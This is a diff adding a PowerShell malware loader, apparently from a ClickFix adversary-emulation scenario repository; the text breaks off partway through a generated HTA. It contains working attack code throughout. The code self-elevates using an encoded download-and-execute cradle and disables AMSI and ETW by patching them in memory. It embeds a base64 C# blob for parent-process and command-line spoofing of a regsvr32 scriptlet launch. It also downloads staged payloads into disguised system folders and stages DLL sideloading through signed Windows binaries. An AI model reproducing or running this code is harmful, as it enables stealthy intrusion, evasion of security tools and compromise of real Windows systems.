@@ -1,0 +1,222 @@
+param()
+
+# -- CONFIG --
+$scriptBase = "https://raw.githubusercontent.com/Justanother-engineer/scenario-02-clickfix/main"
+
+# -- Logging (defined early so the UAC gate can write to it) --
+$logFile = "C:\ProgramData\USOShared\Logs\cache.dat"
+function Write-Log($msg) {
+    $parent = Split-Path $logFile -Parent
+    if (-not (Test-Path $parent)) { New-Item -Path $parent -ItemType Directory -Force | Out-Null }
+    "$(Get-Date -Format '[yyyy-MM-dd HH:mm:ss]') $msg" | Out-File $logFile -Append
+}
+
+# -- Elevation Gate --
+$isAdmin = [Security.Principal.WindowsPrincipal]::new(
+    [Security.Principal.WindowsIdentity]::GetCurrent()
+).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+
+if (-not $isAdmin) {
+    Write-Log "[!] UAC check: not admin, requesting elevation..."
+    $scriptUrl = "$scriptBase/src/loader.ps2?t=$(Get-Date -Format 'yyyyMMddHHmmss')"
+    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(
+        "iex((New-Object Net.WebClient).DownloadString('$scriptUrl'))"
+    ))
+    Start-Process powershell -Verb RunAs -ArgumentList "-NoP -Exec Bypass -Enc $b64"
+    exit
+}
+
+Write-Log "[+] UAC check: admin=True"
+Write-Log "[*] loader.ps2 started"
+
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+[Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField('etwProvider','NonPublic,Static').SetValue($null,[Guid]::Empty)
+
+# -- AMSI/ETW Bypass via reflective .NET (VirtualProtect + Marshal.Copy) --
+$BypassCode = @'
+using System;
+using System.Runtime.InteropServices;
+public class Bypass {
+    [DllImport("kernel32.dll")]public static extern IntPtr GetProcAddress(IntPtr h, string n);
+    [DllImport("kernel32.dll")]public static extern IntPtr LoadLibrary(string n);
+    [DllImport("kernel32.dll")]public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
+    public static void Go() {
+        var a = LoadLibrary("amsi.dll"); var b = GetProcAddress(a, "AmsiScanBuffer");
+        VirtualProtect(b, (UIntPtr)6, 0x40, out uint o);
+        Marshal.Copy(new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3}, 0, b, 6);
+        VirtualProtect(b, (UIntPtr)6, o, out _);
+        var c = LoadLibrary("ntdll.dll"); var d = GetProcAddress(c, "EtwEventWrite");
+        VirtualProtect(d, (UIntPtr)1, 0x40, out uint o2);
+        Marshal.Copy(new byte[]{0xC3}, 0, d, 1);
+    }
+}
+'@
+Add-Type $BypassCode -ErrorAction Stop
+[Bypass]::Go()
+Write-Log "[+] AMSI/ETW patched"
+
+# -- Scatter directories --
+"C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18","C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys","C:\ProgramData\Microsoft\Network","C:\ProgramData\Microsoft\Windows\Caches","C:\Users\Public\Libraries" | ForEach-Object { New-Item -Path $_ -ItemType Directory -Force | Out-Null }
+
+$spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7CnVzaW5nIFN5c3RlbS5UZXh0OwoKcHVibGljIHN0YXRpYyBjbGFzcyBTcG9vZgp7CiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3NXKAogICAgICAgIHN0cmluZyBscEFwcGxpY2F0aW9uTmFtZSwKICAgICAgICBzdHJpbmcgbHBDb21tYW5kTGluZSwKICAgICAgICBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywKICAgICAgICBJbnRQdHIgbHBUaHJlYWRBdHRyaWJ1dGVzLAogICAgICAgIGJvb2wgYkluaGVyaXRIYW5kbGVzLAogICAgICAgIHVpbnQgZHdDcmVhdGlvbkZsYWdzLAogICAgICAgIEludFB0ciBscEVudmlyb25tZW50LAogICAgICAgIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksCiAgICAgICAgcmVmIFNUQVJUVVBJTkZPIGxwU3RhcnR1cEluZm8sCiAgICAgICAgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBOdFF1ZXJ5SW5mb3JtYXRpb25Qcm9jZXNzKAogICAgICAgIEludFB0ciBoUHJvY2VzcywKICAgICAgICBpbnQgUHJvY2Vzc0luZm9ybWF0aW9uQ2xhc3MsCiAgICAgICAgb3V0IFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04gcGJpLAogICAgICAgIGludCBjYiwKICAgICAgICBvdXQgaW50IHJldHVybkxlbmd0aCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBSZWFkUHJvY2Vzc01lbW9yeSgKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgSW50UHRyIGxwQmFzZUFkZHJlc3MsCiAgICAgICAgSW50UHRyIGxwQnVmZmVyLAogICAgICAgIGludCBkd1NpemUsCiAgICAgICAgb3V0IGludCBscE51bWJlck9mQnl0ZXNSZWFkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFdyaXRlUHJvY2Vzc01lbW9yeSgKICAgICAgICBJbnRQdHIgaFByb2Nlc3MsCiAgICAgICAgSW50UHRyIGxwQmFzZUFkZHJlc3MsCiAgICAgICAgYnl0ZVtdIGxwQnVmZmVyLAogICAgICAgIGludCBkd1NpemUsCiAgICAgICAgb3V0IGludCBscE51bWJlck9mQnl0ZXNXcml0dGVuKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IFJlc3VtZVRocmVhZChJbnRQdHIgaFRocmVhZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgcHJpdmF0ZSBjb25zdCB1aW50IENSRUFURV9TVVNQRU5ERUQgPSAweDAwMDAwMDA0OwogICAgcHJpdmF0ZSBjb25zdCBpbnQgUHJvY2Vzc0Jhc2ljSW5mb3JtYXRpb24gPSAwOwoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgIHByaXZhdGUgc3RydWN0IFNUQVJUVVBJTkZPCiAgICB7CiAgICAgICAgcHVibGljIGludCBjYjsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwUmVzZXJ2ZWQ7CiAgICAgICAgcHVibGljIHN0cmluZyBscERlc2t0b3A7CiAgICAgICAgcHVibGljIHN0cmluZyBscFRpdGxlOwogICAgICAgIHB1YmxpYyBpbnQgZHdYOwogICAgICAgIHB1YmxpYyBpbnQgZHdZOwogICAgICAgIHB1YmxpYyBpbnQgZHdYU2l6ZTsKICAgICAgICBwdWJsaWMgaW50IGR3WVNpemU7CiAgICAgICAgcHVibGljIGludCBkd1hDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBpbnQgZHdZQ291bnRDaGFyczsKICAgICAgICBwdWJsaWMgaW50IGR3RmlsbEF0dHJpYnV0ZTsKICAgICAgICBwdWJsaWMgaW50IGR3RmxhZ3M7CiAgICAgICAgcHVibGljIHNob3J0IHdTaG93V2luZG93OwogICAgICAgIHB1YmxpYyBzaG9ydCBjYlJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgUFJPQ0VTU19CQVNJQ19JTkZPUk1BVElPTgogICAgewogICAgICAgIHB1YmxpYyBJbnRQdHIgRXhpdFN0YXR1czsKICAgICAgICBwdWJsaWMgSW50UHRyIFBlYkJhc2VBZGRyZXNzOwogICAgICAgIHB1YmxpYyBJbnRQdHIgQWZmaW5pdHlNYXNrOwogICAgICAgIHB1YmxpYyBJbnRQdHIgQmFzZVByaW9yaXR5OwogICAgICAgIHB1YmxpYyBJbnRQdHIgVW5pcXVlUHJvY2Vzc0lkOwogICAgICAgIHB1YmxpYyBJbnRQdHIgSW5oZXJpdGVkRnJvbVVuaXF1ZVByb2Nlc3NJZDsKICAgIH0KCiAgICBwcml2YXRlIGNvbnN0IGludCBDb21tYW5kTGluZU9mZnNldCA9IDB4NzA7CgogICAgLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICAvLyBQUElEIFNwb29maW5nOiBTcGF3biBwcm9jZXNzIHdpdGggc3BlY2lmaWVkIHBhcmVudCBQSUQKICAgIC8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBPcGVuUHJvY2Vzcyh1aW50IGR3RGVzaXJlZEFjY2VzcywgYm9vbCBiSW5oZXJpdEhhbmRsZSwgaW50IGR3UHJvY2Vzc0lkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIEluaXRpYWxpemVQcm9jVGhyZWFkQXR0cmlidXRlTGlzdCgKICAgICAgICBJbnRQdHIgbHBBdHRyaWJ1dGVMaXN0LCBpbnQgZHdBdHRyaWJ1dGVDb3VudCwgaW50IGR3RmxhZ3MsIHJlZiBJbnRQdHIgbHBTaXplKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUoCiAgICAgICAgSW50UHRyIGxwQXR0cmlidXRlTGlzdCwgdWludCBkd0ZsYWdzLCBJbnRQdHIgYXR0cmlidXRlLAogICAgICAgIEludFB0ciBscFZhbHVlLCBJbnRQdHIgY2JTaXplLCBJbnRQdHIgbHBQcmV2aW91c1ZhbHVlLCBJbnRQdHIgbHBSZXR1cm5TaXplKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3MoCiAgICAgICAgc3RyaW5nIGxwQXBwbGljYXRpb25OYW1lLCBzdHJpbmcgbHBDb21tYW5kTGluZSwKICAgICAgICBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywKICAgICAgICBib29sIGJJbmhlcml0SGFuZGxlcywgdWludCBkd0NyZWF0aW9uRmxhZ3MsCiAgICAgICAgSW50UHRyIGxwRW52aXJvbm1lbnQsIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksCiAgICAgICAgcmVmIFNUQVJUVVBJTkZPRVggbHBTdGFydHVwSW5mbywKICAgICAgICBvdXQgUFJPQ0VTU19JTkZPUk1BVElPTiBscFByb2Nlc3NJbmZvcm1hdGlvbik7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBEZWxldGVQcm9jVGhyZWFkQXR0cmlidXRlTGlzdChJbnRQdHIgbHBBdHRyaWJ1dGVMaXN0KTsKCiAgICBwcml2YXRlIGNvbnN0IHVpbnQgUFJPQ19DUkVBVEVfUFJPQ0VTUyA9IDB4MDA4MDsKICAgIHByaXZhdGUgY29uc3QgdWludCBFWFRFTkRFRF9TVEFSVFVQSU5GT19QUkVTRU5UID0gMHgwMDA4MDAwMDsKICAgIHByaXZhdGUgY29uc3QgdWludCBDUkVBVEVfTk9fV0lORE9XID0gMHgwODAwMDAwMDsKICAgIHByaXZhdGUgc3RhdGljIHJlYWRvbmx5IEludFB0ciBQcm9jVGhyZWFkQXR0cmlidXRlUGFyZW50UHJvY2VzcyA9IG5ldyBJbnRQdHIoMHgwMDAyMDAwMCk7CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU1RBUlRVUElORk9FWAogICAgewogICAgICAgIHB1YmxpYyBTVEFSVFVQSU5GTyBTdGFydHVwSW5mbzsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwQXR0cmlidXRlTGlzdDsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIGludCBTcGF3bldpdGhQYXJlbnQoc3RyaW5nIGNtZExpbmUsIGludCBwYXJlbnRQaWQpCiAgICB7CiAgICAgICAgSW50UHRyIGhQYXJlbnQgPSBPcGVuUHJvY2VzcyhQUk9DX0NSRUFURV9QUk9DRVNTLCBmYWxzZSwgcGFyZW50UGlkKTsKICAgICAgICBpZiAoaFBhcmVudCA9PSBJbnRQdHIuWmVybykKICAgICAgICAgICAgcmV0dXJuIC0xOwoKICAgICAgICBJbnRQdHIgYXR0ckxpc3RTaXplID0gSW50UHRyLlplcm87CiAgICAgICAgSW5pdGlhbGl6ZVByb2NUaHJlYWRBdHRyaWJ1dGVMaXN0KEludFB0ci5aZXJvLCAxLCAwLCByZWYgYXR0ckxpc3RTaXplKTsKCiAgICAgICAgSW50UHRyIGF0dHJMaXN0ID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwoYXR0ckxpc3RTaXplKTsKICAgICAgICBpZiAoYXR0ckxpc3QgPT0gSW50UHRyLlplcm8pCiAgICAgICAgewogICAgICAgICAgICBDbG9zZUhhbmRsZShoUGFyZW50KTsKICAgICAgICAgICAgcmV0dXJuIC0xOwogICAgICAgIH0KCiAgICAgICAgaWYgKCFJbml0aWFsaXplUHJvY1RocmVhZEF0dHJpYnV0ZUxpc3QoYXR0ckxpc3QsIDEsIDAsIHJlZiBhdHRyTGlzdFNpemUpKQogICAgICAgIHsKICAgICAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChhdHRyTGlzdCk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKGhQYXJlbnQpOwogICAgICAgICAgICByZXR1cm4gLTE7CiAgICAgICAgfQoKICAgICAgICBJbnRQdHIgcGFyZW50UHRyID0gTWFyc2hhbC5BbGxvY0hHbG9iYWwoSW50UHRyLlNpemUpOwogICAgICAgIE1hcnNoYWwuV3JpdGVJbnRQdHIocGFyZW50UHRyLCBoUGFyZW50KTsKICAgICAgICBVcGRhdGVQcm9jVGhyZWFkQXR0cmlidXRlKGF0dHJMaXN0LCAwLCBQcm9jVGhyZWFkQXR0cmlidXRlUGFyZW50UHJvY2VzcywKICAgICAgICAgICAgcGFyZW50UHRyLCAoSW50UHRyKUludFB0ci5TaXplLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8pOwoKICAgICAgICBTVEFSVFVQSU5GT0VYIHNpRXggPSBuZXcgU1RBUlRVUElORk9FWCgpOwogICAgICAgIHNpRXguU3RhcnR1cEluZm8uY2IgPSBNYXJzaGFsLlNpemVPZih0eXBlb2YoU1RBUlRVUElORk9FWCkpOwoKICAgICAgICBzaUV4LmxwQXR0cmlidXRlTGlzdCA9IGF0dHJMaXN0OwoKICAgICAgICBQUk9DRVNTX0lORk9STUFUSU9OIHBpOwogICAgICAgIGJvb2wgY3JlYXRlZCA9IENyZWF0ZVByb2Nlc3MobnVsbCwgY21kTGluZSwKICAgICAgICAgICAgSW50UHRyLlplcm8sIEludFB0ci5aZXJvLCBmYWxzZSwKICAgICAgICAgICAgRVhURU5ERURfU1RBUlRVUElORk9fUFJFU0VOVCB8IENSRUFURV9OT19XSU5ET1csCiAgICAgICAgICAgIEludFB0ci5aZXJvLCBudWxsLCByZWYgc2lFeCwgb3V0IHBpKTsKCiAgICAgICAgRGVsZXRlUHJvY1RocmVhZEF0dHJpYnV0ZUxpc3QoYXR0ckxpc3QpOwogICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwoYXR0ckxpc3QpOwogICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwocGFyZW50UHRyKTsKICAgICAgICBDbG9zZUhhbmRsZShoUGFyZW50KTsKCiAgICAgICAgaWYgKGNyZWF0ZWQpCiAgICAgICAgewogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm4gcGkuZHdQcm9jZXNzSWQ7CiAgICAgICAgfQogICAgICAgIHJldHVybiAtMTsKICAgIH0KCiAgICBwdWJsaWMgc3RhdGljIHZvaWQgR28oKQogICAgewogICAgICAgIHN0cmluZyBzcG9vZmVkQ21kID0gInJlZ3N2cjMyIC9zIEM6XFxXaW5kb3dzXFxTeXN0ZW0zMlxcanNjcmlwdC5kbGwiOwogICAgICAgIHN0cmluZyByZWFsQ21kID0gInJlZ3N2cjMyIC9zIC9uIC91IC9pOlwiQzpcXFByb2dyYW1EYXRhXFxNaWNyb3NvZnRcXENyeXB0b1xcUlNBXFxNYWNoaW5lS2V5c1xcc3RhZ2Uuc2N0XCIgc2Nyb2JqLmRsbCI7CgogICAgICAgIFNUQVJUVVBJTkZPIHNpID0gbmV3IFNUQVJUVVBJTkZPKCk7CiAgICAgICAgc2kuY2IgPSBNYXJzaGFsLlNpemVPZih0eXBlb2YoU1RBUlRVUElORk8pKTsKCiAgICAgICAgaWYgKCFDcmVhdGVQcm9jZXNzVyhudWxsLCBzcG9vZmVkQ21kLCBJbnRQdHIuWmVybywgSW50UHRyLlplcm8sIGZhbHNlLAogICAgICAgICAgICBDUkVBVEVfU1VTUEVOREVELCBJbnRQdHIuWmVybywgbnVsbCwgcmVmIHNpLCBvdXQgUFJPQ0VTU19JTkZPUk1BVElPTiBwaSkpCiAgICAgICAgewogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBpZiAoTnRRdWVyeUluZm9ybWF0aW9uUHJvY2VzcyhwaS5oUHJvY2VzcywgUHJvY2Vzc0Jhc2ljSW5mb3JtYXRpb24sCiAgICAgICAgICAgIG91dCBQUk9DRVNTX0JBU0lDX0lORk9STUFUSU9OIHBiaSwgTWFyc2hhbC5TaXplT2YodHlwZW9mKFBST0NFU1NfQkFTSUNfSU5GT1JNQVRJT04pKSwKICAgICAgICAgICAgb3V0IGludCByZXRMZW4pICE9IDApCiAgICAgICAgewogICAgICAgICAgICBSZXN1bWVUaHJlYWQocGkuaFRocmVhZCk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIEludFB0ciBwZWJCdWYgPSBNYXJzaGFsLkFsbG9jSEdsb2JhbChJbnRQdHIuU2l6ZSAqIDQpOwogICAgICAgIGlmICghUmVhZFByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIHBiaS5QZWJCYXNlQWRkcmVzcywgcGViQnVmLCBJbnRQdHIuU2l6ZSAqIDQsIG91dCBpbnQgYnl0ZXNSZWFkKSkKICAgICAgICB7CiAgICAgICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwocGViQnVmKTsKICAgICAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oUHJvY2Vzcyk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhUaHJlYWQpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBpbnQgcHBPZmZzZXQgPSBJbnRQdHIuU2l6ZSA9PSA4ID8gMHgyMCA6IDB4MTA7CiAgICAgICAgSW50UHRyIHByb2Nlc3NQYXJhbWV0ZXJzUHRyID0gTWFyc2hhbC5SZWFkSW50UHRyKHBlYkJ1ZiwgcHBPZmZzZXQpOwogICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwocGViQnVmKTsKCiAgICAgICAgSW50UHRyIGNtZEJ1ZiA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKDE2KTsKICAgICAgICBpZiAoIVJlYWRQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBJbnRQdHIuQWRkKHByb2Nlc3NQYXJhbWV0ZXJzUHRyLCBDb21tYW5kTGluZU9mZnNldCksIGNtZEJ1ZiwgMTYsIG91dCBieXRlc1JlYWQpKQogICAgICAgIHsKICAgICAgICAgICAgTWFyc2hhbC5GcmVlSEdsb2JhbChjbWRCdWYpOwogICAgICAgICAgICBSZXN1bWVUaHJlYWQocGkuaFRocmVhZCk7CiAgICAgICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFRocmVhZCk7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIGJ5dGVbXSBuZXdDbWRCeXRlcyA9IEVuY29kaW5nLlVuaWNvZGUuR2V0Qnl0ZXMocmVhbENtZCk7CiAgICAgICAgSW50UHRyIGJ1ZmZlclB0ciA9IE1hcnNoYWwuUmVhZEludFB0cihjbWRCdWYsIDgpOwogICAgICAgIE1hcnNoYWwuRnJlZUhHbG9iYWwoY21kQnVmKTsKCiAgICAgICAgaWYgKCFXcml0ZVByb2Nlc3NNZW1vcnkocGkuaFByb2Nlc3MsIGJ1ZmZlclB0ciwgbmV3Q21kQnl0ZXMsIG5ld0NtZEJ5dGVzLkxlbmd0aCwgb3V0IGludCB3cml0dGVuKSkKICAgICAgICB7CiAgICAgICAgICAgIFJlc3VtZVRocmVhZChwaS5oVGhyZWFkKTsKICAgICAgICAgICAgQ2xvc2VIYW5kbGUocGkuaFByb2Nlc3MpOwogICAgICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgICAgICAgICAgcmV0dXJuOwogICAgICAgIH0KCiAgICAgICAgYnl0ZVtdIGxlbmd0aEJ5dGVzID0gQml0Q29udmVydGVyLkdldEJ5dGVzKG5ld0NtZEJ5dGVzLkxlbmd0aCk7CiAgICAgICAgYnl0ZVtdIG1heExlbmd0aEJ5dGVzID0gQml0Q29udmVydGVyLkdldEJ5dGVzKG5ld0NtZEJ5dGVzLkxlbmd0aCk7CiAgICAgICAgYnl0ZVtdIGNtZEJ1ZkJ5dGVzID0gbmV3IGJ5dGVbMTZdOwogICAgICAgIEJ1ZmZlci5CbG9ja0NvcHkobGVuZ3RoQnl0ZXMsIDAsIGNtZEJ1ZkJ5dGVzLCAwLCAyKTsKICAgICAgICBCdWZmZXIuQmxvY2tDb3B5KG1heExlbmd0aEJ5dGVzLCAwLCBjbWRCdWZCeXRlcywgMiwgMik7CiAgICAgICAgV3JpdGVQcm9jZXNzTWVtb3J5KHBpLmhQcm9jZXNzLCBJbnRQdHIuQWRkKHByb2Nlc3NQYXJhbWV0ZXJzUHRyLCBDb21tYW5kTGluZU9mZnNldCksIGNtZEJ1ZkJ5dGVzLCBjbWRCdWZCeXRlcy5MZW5ndGgsIG91dCB3cml0dGVuKTsKCiAgICAgICAgUmVzdW1lVGhyZWFkKHBpLmhUaHJlYWQpOwogICAgICAgIENsb3NlSGFuZGxlKHBpLmhQcm9jZXNzKTsKICAgICAgICBDbG9zZUhhbmRsZShwaS5oVGhyZWFkKTsKICAgIH0KfQo="
+
+# -- Download artifacts --
+$payloadUrl = "$scriptBase/src/payload.dll"
+$payloadPath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\payload.dll"
+$sctUrl = "$scriptBase/src/stage.sct"
+$sctPath = "C:\ProgramData\Microsoft\Search\Data\EDS\stage.sct"
+$jsUrl = "$scriptBase/src/stage.js"
+$jsPath = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\stage.js"
+
+Write-Log "[*] Downloading payload.dll..."
+try {
+    Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing
+    if (Test-Path $payloadPath) { Write-Log "[+] payload.dll downloaded - $((Get-Item $payloadPath).Length) bytes" }
+    else { Write-Log "[-] payload.dll download FAILED" }
+} catch { Write-Log "[-] payload.dll download FAILED - $_" }
+
+Write-Log "[*] Downloading stage.sct..."
+try {
+    Invoke-WebRequest -Uri $sctUrl -OutFile $sctPath -UseBasicParsing
+    if (Test-Path $sctPath) { Write-Log "[+] stage.sct downloaded" }
+    else { Write-Log "[-] stage.sct download FAILED" }
+} catch { Write-Log "[-] stage.sct download FAILED - $_" }
+
+Write-Log "[*] Downloading stage.js..."
+try {
+    Invoke-WebRequest -Uri $jsUrl -OutFile $jsPath -UseBasicParsing
+    if (Test-Path $jsPath) { Write-Log "[+] stage.js downloaded" }
+    else { Write-Log "[-] stage.js download FAILED" }
+} catch { Write-Log "[-] stage.js download FAILED - $_" }
+
+# -- Decode embedded C# blob --
+$spoofBytes = [Convert]::FromBase64String($spoofBase64)
+$spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)
+Write-Log "[*] Decoded spoof source - $($spoofSource.Length) chars"
+
+# -- Escape C# source for JavaScript string literal --
+$escapedCsSource = $spoofSource -replace '\\', '\\\\' -replace '"', '\"' -replace "`r`n", '\n' -replace "`n", '\n'
+
+# -- Generate HTA orchestrator (written to WER\Temp as report.hta) --
+$htaPath = "C:\ProgramData\Microsoft\Windows\WER\Temp\report.hta"
+
+$htaContent = @"
+<html>
+<head>
+<script language="JScript">
+try {
+    var a = new ActiveXObject("WScript.Shell");
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+} catch(e) {}
+
+var shell = new ActiveXObject("WScript.Shell");
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var logPath = "C:\\ProgramData\\USOShared\\Logs\\cache.dat";
+
+function log(msg) {
+    try {
+        var f = fso.OpenTextFile(logPath, 8, true);
+        var now = new Date();
+        var ts = "[" + now.getFullYear() + "-" + ("0"+(now.getMonth()+1)).slice(-2) + "-" + ("0"+now.getDate()).slice(-2) + " " +
+                 ("0"+now.getHours()).slice(-2) + ":" + ("0"+now.getMinutes()).slice(-2) + ":" + ("0"+now.getSeconds()).slice(-2) + "] ";
+        f.WriteLine(ts + msg);
+        f.Close();
+    } catch(e) {}
+}
+
+log("[*] agent.hta started");
+
+// Stage 1: Copy files for DLL sideloading
+log("[*] Copying package.dll -> msimtf.dll");
+try {
+    fso.CopyFile("C:\\ProgramData\\Package Cache\\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\\package.dll", "C:\\Users\\Public\\Libraries\\msimtf.dll", true);
+    log("[+] msimtf.dll copy OK");
+} catch(e) { log("[-] msimtf.dll copy FAILED: " + e.message); }
+
+// Stage 2: Select sideloader binary (tcmsetup.exe preferred, colorcpl.exe fallback)
+var sideloadExe = "tcmsetup.exe";
+var sideloadSrc = "C:\\Windows\\System32\\tcmsetup.exe";
+if (!fso.FileExists(sideloadSrc)) {
+    log("[*] tcmsetup.exe not found — falling back to colorcpl.exe");
+    sideloadExe = "colorcpl.exe";
+    sideloadSrc = "C:\\Windows\\System32\\colorcpl.exe";
+    if (!fso.FileExists(sideloadSrc)) {
+        log("[-] No sideloader binary found (tcmsetup.exe or colorcpl.exe) — skipping DLL sideload");
+        sideloadExe = null;
+    }
+}
